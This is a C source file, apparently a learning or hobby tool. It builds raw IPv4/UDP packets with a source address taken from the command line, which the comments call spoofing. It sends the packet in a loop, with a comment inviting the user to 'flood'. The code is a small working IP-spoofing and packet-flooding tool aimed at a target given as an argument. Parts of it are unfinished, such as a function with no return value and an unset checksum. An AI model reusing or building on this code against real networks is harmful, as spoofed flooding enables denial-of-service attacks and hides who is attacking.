#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<sys/socket.h>
#include <stdlib.h> //for exit(0);
#include<arpa/inet.h>
#include<unistd.h>
// #include <netinet/tcp.h>	//Provides declarations for tcp header
#include<netinet/udp.h>	//Provides declarations for udp header
#include <netinet/ip.h>	//Provides declarations for ip header
#include <arpa/inet.h> // inet_addr


short SocketCreate(void)
{
    short hSocket;
    printf("Create the socket\n");
    hSocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW );
    return hSocket;
}

int SocketConnect(int hSocket,char argv[])
{
    int iRetval=-1;
    int ServerPort = 4000;
    struct sockaddr_in remote= {0};
    remote.sin_addr.s_addr = inet_addr(argv); //Local Host
    remote.sin_family = AF_INET;
    remote.sin_port = htons(ServerPort);
    iRetval = connect(hSocket,(struct sockaddr *)&remote,sizeof(struct sockaddr_in));
    return iRetval;
}

int SocketSend(int hSocket,char* Rqst,short lenRqst)
{
    int shortRetval = -1;
    struct timeval tv;
    tv.tv_sec = 20;  /* 20 Secs Timeout */
    tv.tv_usec = 0;
    if(setsockopt(hSocket,SOL_SOCKET,SO_SNDTIMEO,(char *)&tv,sizeof(tv)) < 0)
    {
        printf("Time Out\n");
        return -1;
    }
    shortRetval = send(hSocket, Rqst, lenRqst, 0);
    // shortRetval = sendto (s, datagram, iph->tot_len ,	0, (struct sockaddr *) &sin, sizeof (sin));
}

int main(int argc , char * argv[]){
    
    int hSocket , read_size;
    struct sockaddr_in server;
    char SendToServer[100] = {'a','b'};
    // char server_reply[200] = {0};
    char datagram[4096] , source_ip[32] , *data , *pseudogram;
    char dest_ip[32];

    //zero out the packet buffer
	memset (datagram, 0, 4096);
    
    //creating the socket
    hSocket = SocketCreate();
    if(hSocket == -1){
        printf("Cannot create the socket\n");
        return 1;
    }
    printf("Socket is created\n");

    // connect to the remote server
    if (SocketConnect(hSocket,argv[2]) < 0)
    {
        perror("connect failed.\n");
        return 1;
    }
    printf("connected to server");

    //IP HEADER
    struct iphdr *iph = (struct iphdr *) datagram;
    
    //UDP HEADER
    struct udphdr * udph = (struct udphdr *)(datagram + sizeof (struct ip));

    struct sockaddr_in sin;
    // struct pseudo_header psh;

    //Data part
	data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
	strcpy(data , "ABCDEFGHIJKLMNOPQRSTUVWXYZ");

    sin.sin_family = AF_INET;
	sin.sin_port = htons(80);
	sin.sin_addr.s_addr = inet_addr (argv[2]);

    //Fill in the IP Header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr) + strlen(data);
	iph->id = htonl (54321);	//Id of this packet
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;		//Set to 0 before calculating checksum
	iph->saddr = inet_addr (argv[1]);	//Spoof the source ip address
	iph->daddr = sin.sin_addr.s_addr;

    //UDP header
	udph->source = htons (6666);
	udph->dest = htons (8622);
	udph->len = htons(8 + strlen(data));	//tcp header size
	udph->check = 0;	//leave checksum 0 now, filled later by pseudo header

    //loop if you want to flood :)
    int i = 1;
	while (i < 20)
	{
		//Send the packet
		if (sendto (hSocket, datagram, iph->tot_len ,	0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
		{
			perror("sendto failed");
		}
		//Data send successfully
		else
		{
			printf ("Packet Send. Length : %d \n" , iph->tot_len);
		}
        i++;
	}

    return 0;
}